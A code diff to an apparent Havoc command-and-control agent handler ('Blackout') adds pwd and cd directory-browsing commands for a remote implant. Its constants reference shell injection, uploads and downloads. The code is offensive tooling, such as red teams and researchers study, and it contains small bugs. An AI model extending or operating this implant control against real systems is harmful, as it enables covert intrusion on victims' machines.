@@ -15,6 +15,12 @@ COMMAND_UPLOAD           = 0x153
 COMMAND_DOWNLOAD         = 0x154
 COMMAND_SHELLINJECT      = 0x161
 
+COMMAND_EXPLORER         = 0X180
+EXPLORER_LS  = 0x181
+EXPLORER_CD  = 0x182
+EXPLORER_PWD = 0x183
+EXPLORER_CAT = 0x184
+
 COMMAND_SLEEP            = 0x111
 COMMAND_PPID             = 0x140
 COMMAND_BLOCKDLLS        = 0x141
@@ -66,11 +72,51 @@ class CommandRun( Command ):
 
         return Task.buffer
     
-class CommandExitThread( Command ):
+class CommandPwd( Command ):
+    CommandId   = COMMAND_EXPLORER
+    Name        = "pwd"
+    Description = "print current directory"
+    Help        = ""
+    NeedAdmin   = False
+    Mitr = []   
+    Params = []
+
+    def job_generate( self, arguments:dict ) -> bytes:
+        Task = Packer()
+
+        Task.add_int( self.CommandId )
+        Task.add_int( EXPLORER_PWD )
+        
+        return Task.buffer
+    
+class CommandCd( Command ):
+    CommandId   = COMMAND_EXPLORER
+    Name        = "cd"
+    Description = "change directory"
+    Help        = ""
+    NeedAdmin   = False
+    Mitr = []   
+    Params = [
+        CommandParam(
+            name="dir",
+            is_file_path=False,
+            is_optional=True
+        )
+    ]
+
+    def job_generate( self, arguments:dict ) -> bytes:
+        Task = Packer()
+
+        Task.add_int( self.CommandId )
+        Task.add_int( EXPLORER_CD )
+        Task.add_data( arguments[ 'dir' ] )
+
+        return Task.buffer
+
+class CommandExit( Command ):
     CommandId = COMMAND_EXITT
 
-class CommandExitProcess( Command ):
-    CommandId = COMMAND_EXITP
+
 
 # =======================
 # ===== Agent Class =====
@@ -100,7 +146,9 @@ class Blackout(AgentType):
 
     Commands = [
         CommandCheckin(),
-        CommandRun()
+        CommandRun(),
+        CommandCd,
+        CommandPwd()
     ]
 
     # generate. this function is getting executed when the Havoc client requests for a binary/executable/payload. you can generate your payloads in this function.
@@ -296,7 +344,16 @@ class Blackout(AgentType):
 
                 self.console_message( AgentID, "Good", f"Process create succefully:", Output )
 
+            elif Command == COMMAND_EXPLORER:
+                explorer_id = response_parser.parse_int()
+
+                if ( explorer_id == EXPLORER_CD ):
+                    self.console_message( AgentID, "Good", "Successfully changed to directory %4x" % Command, "" )
     
+                elif ( explorer_id == EXPLORER_PWD ):
+                    curdir = response_parser.parse_str()
+                    self.console_message( AgentID, "Good", f"Current directory is: {curdir}", "" )
+
             elif Command == BLACKOUT_ERROR:
                 ErrCode = response_parser.parse_int() 
                 ErrMsg  = response_parser.parse_str()
